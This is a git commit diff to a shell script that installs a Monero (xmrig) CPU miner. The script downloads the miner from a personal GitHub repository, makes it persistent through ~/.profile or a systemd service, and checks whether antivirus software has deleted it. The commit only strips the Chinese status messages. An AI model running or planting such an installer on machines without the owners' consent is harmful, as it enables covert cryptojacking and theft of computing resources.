50c8e25a41424493a9c843e96d02d435b38cad5b
teshushu <905353149@qq.com>
2023-01-18 00:47:19 +0800

    Update setup_c3pool_miner.sh

--- setup_c3pool_miner.sh
+++ setup_c3pool_miner.sh
@@ -10,7 +10,6 @@ echo
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
-  echo "警告: 不建议在root用户下使用此脚本"
 fi
 
 # command line arguments
@@ -122,11 +121,8 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "将进行下载设置,并在后台中运行xmrig矿工."
 echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HOME/c3pool/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
-echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
 fi
@@ -134,10 +130,8 @@ echo
 
 if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
-  echo "由于脚本无法执行无密码的sudo，因此在您重启后首次登录此主机时，后台开采将从您的 $HOME/.profile 文件开始."
 else
   echo "Mining in background will be performed using c3pool_miner systemd service."
-  echo "后台开采将使用c3pool_miner systemd服务执行."
 fi
 
 echo
@@ -148,7 +142,6 @@ echo
 # start doing stuff: preparing miner
 
 echo "[*] Removing previous c3pool miner (if any)"
-echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop c3pool_miner.service
 fi
@@ -158,75 +151,59 @@ echo "[*] Removing $HOME/c3pool directory"
 rm -rf $HOME/c3pool
 
 echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
-echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
 if ! curl -L --progress-bar "https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  echo "发生错误: 无法下载 https://github.com/teshushu/BiBi/raw/main/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
   exit 1
 fi
 
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
 [ -d $HOME/c3pool ] || mkdir $HOME/c3pool
 if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
-  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
 $HOME/c3pool/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/c3pool/xmrig ]; then
     echo "WARNING: Advanced version of $HOME/c3pool/xmrig is not functional"
-	echo "警告: 版本 $HOME/c3pool/xmrig 无法正常工作"
   else 
     echo "WARNING: Advanced version of $HOME/c3pool/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/c3pool/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
-  echo "[*] 查看最新版本的 xmrig 挖矿工具"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
-  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
     exit 1
   fi
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
   if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
-	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录下"
   fi
   rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/c3pool/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
   $HOME/c3pool/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HOME/c3pool/xmrig ]; then
       echo "ERROR: Stock version of $HOME/c3pool/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/xmrig 也无法使用"
     else 
       echo "ERROR: Stock version of $HOME/c3pool/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/xmrig 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
 echo "[*] Miner $HOME/c3pool/xmrig is OK"
-echo "[*] 矿工 $HOME/c3pool/xmrig 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -252,7 +229,6 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_backgr
 # preparing script
 
 echo "[*] Creating $HOME/c3pool/miner.sh script"
-echo "[*] 在该目录下创建 $HOME/c3pool/miner.sh 脚本"
 cat >$HOME/c3pool/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
@@ -260,8 +236,6 @@ if ! pidof xmrig >/dev/null; then
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
-  echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台矿工，请运行 \"killall xmrig\" 或 \"sudo killall xmrig\"."
 fi
 EOL
 
@@ -272,20 +246,16 @@ chmod +x $HOME/c3pool/miner.sh
 if ! sudo -n true 2>/dev/null; then
   if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
     echo "[*] Adding $HOME/c3pool/miner.sh script to $HOME/.profile"
-	echo "[*] 添加 $HOME/c3pool/miner.sh 到 $HOME/.profile"
     echo "$HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
     echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
-	echo "脚本 $HOME/c3pool/miner.sh 已存在于 $HOME/.profile 中."
   fi
   echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-  echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
   /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
     echo "[*] Enabling huge pages"
-	echo "[*] 启用 huge pages"
     echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
     sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
   fi
@@ -293,7 +263,6 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
     /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
@@ -316,19 +285,16 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
     echo "[*] Starting c3pool_miner systemd service"
-	echo "[*] 启动c3pool_miner systemd服务"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
     sudo systemctl enable c3pool_miner.service
     sudo systemctl start c3pool_miner.service
     echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u c3pool_miner -f\" 命令"
   fi
 fi
 
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
-echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU使用率，否则可能将被禁止使用"
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
@@ -346,4 +312,4 @@ fi
 echo ""
 
 echo "[*] Setup complete"
-echo "[*] 安装完成"
+echo "[*] Yes-Go"
